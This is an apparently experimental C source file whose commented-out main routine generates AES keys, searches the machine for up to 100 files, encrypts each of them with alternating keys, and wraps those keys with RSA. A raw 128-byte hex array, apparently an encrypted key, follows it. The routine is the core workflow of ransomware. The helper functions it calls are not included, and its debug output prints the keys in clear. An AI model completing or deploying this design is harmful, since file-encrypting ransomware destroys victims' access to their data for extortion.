//#include "genkey.h"
//#include "fsearch.h"
//#include "aes_enc.h"
//#include "rsa_enc.h"
//#include <string.h>
//
//int main() {
//	//==============================
//	// genarate key and iv
//	//==============================
//	unsigned char iv[32];
//	unsigned char iv_1[16];
//	unsigned char key_512[64];
//	unsigned char key_1[32];
//	unsigned char key_2[32];
//
//	unsigned char iv_2[16];
//	unsigned char key_3[32];
//	
//	gen_key(iv, 256);
//	gen_key(key_512, 512);
//	memcpy(key_1, key_512, 32); // Copy first 32 bytes to key_1
//	memcpy(key_2, key_512 + 32, 32); // Copy next 32 bytes to key_2
//	memcpy(iv_1, iv, 16); // Copy first 32 bytes to key_1
//	memcpy(iv_2, iv + 16, 16); // Copy next 32 bytes to key_2
//	gen_key(key_3, 256);
//
//	printf("iv_1: \n");
//	key_print(iv_1, sizeof(iv_1));
//
//	printf("key_512: \n");
//	key_print(key_512, sizeof(key_512));
//
//	printf("key_1: \n");
//	key_print(key_1, sizeof(key_1));
//
//	printf("key_2: \n");
//	key_print(key_2, sizeof(key_2));
//
//	printf("iv_2: \n");
//	key_print(iv_2, sizeof(iv_2));
//
//	printf("key_3: \n");
//	key_print(key_3, sizeof(key_3));
//
//	//==============================
//	// search for files
//	//==============================
//	char f_names[100][MAX_PATH]; // stores the filenames (up to 100)
//	int f_count = 0; // number of files found
//
//	f_search(f_names, &f_count);
//
//	for (int i = 0; i < f_count; ++i)
//		printf("%s\n", f_names[i]);
//
//	//==============================
//	// encrypt files
//	//==============================
//	for (int i = 0; i < f_count; i++) {
//		memcpy(iv_1, iv, 16);
//		if ((i + 1) % 2 == 0) {
//			file_enc(f_names[i], i + 1, key_2, iv_1);
//		}
//		else {
//			file_enc(f_names[i], i + 1, key_1, iv_1);
//		}
//	}
//	//==============================
//	// rsa
//	//==============================
//	unsigned char key1_enc[128];
//	r_enc(key_1, key1_enc);
//	printf("key1_enc: \n");
//	key_print(key1_enc, sizeof(key1_enc));
//
//	unsigned char key2_enc[128];
//	r_enc(key_2, key2_enc);
//	printf("key2_enc: \n");
//	key_print(key2_enc, sizeof(key2_enc));
//
//	unsigned char test[15] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
//	0x09, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15 };
//
//	unsigned char key3_enc[128];
//	r_enc(test, key3_enc);
//	printf("key3_enc: \n");
//	key_print(key3_enc, sizeof(key3_enc));
//
//	unsigned char key1_dec[32];
//	r_dec(key1_enc, key1_dec);
//	printf("key1_dec: \n");
//	key_print(key1_dec, sizeof(key1_dec));
//
//	//==============================
//	return 0;
//}
/* 무제1 (2024-01-02 오전 4:35:51)
   StartOffset(h): 00000000, EndOffset(h): 0000007F, 길이(h): 00000080 */

unsigned char rawData[128] = {
	0x19, 0xE2, 0xE8, 0x98, 0xEA, 0x72, 0x92, 0x76, 0xD8, 0x1B, 0x3E, 0x15,
	0x39, 0x9D, 0xF9, 0xEF, 0xC7, 0xB2, 0xD0, 0xF2, 0xFC, 0x13, 0x8B, 0x9D,
	0x05, 0xE2, 0xF2, 0xF1, 0xB1, 0xB1, 0xF9, 0xA9, 0x9F, 0xA4, 0x7E, 0x75,
	0xBD, 0x2F, 0x21, 0x3F, 0xEA, 0x7D, 0xAB, 0x77, 0x01, 0xEF, 0x36, 0xF3,
	0x5A, 0xDC, 0x47, 0x48, 0xE4, 0x1F, 0x96, 0xD0, 0x02, 0x23, 0x13, 0x4A,
	0x60, 0x61, 0x62, 0xC7, 0x8A, 0x56, 0xF7, 0x1D, 0x47, 0x64, 0xC2, 0xB3,
	0xD3, 0x3B, 0x27, 0x10, 0x5C, 0x0A, 0x15, 0x3F, 0x0E, 0x46, 0xEC, 0xD7,
	0xE1, 0x59, 0xBE, 0xD0, 0xF8, 0x36, 0x1C, 0x6A, 0x80, 0x2E, 0xEF, 0xB7,
	0x46, 0x9D, 0xFF, 0xF5, 0xDB, 0xBB, 0x17, 0xA7, 0x3F, 0x2E, 0x01, 0x7A,
	0x5B, 0xD7, 0x65, 0x6B, 0x7D, 0xE8, 0xFF, 0x5A, 0x91, 0x57, 0x75, 0x93,
	0x38, 0xCE, 0x0C, 0x03, 0x40, 0xA1, 0xF8, 0xE6
};
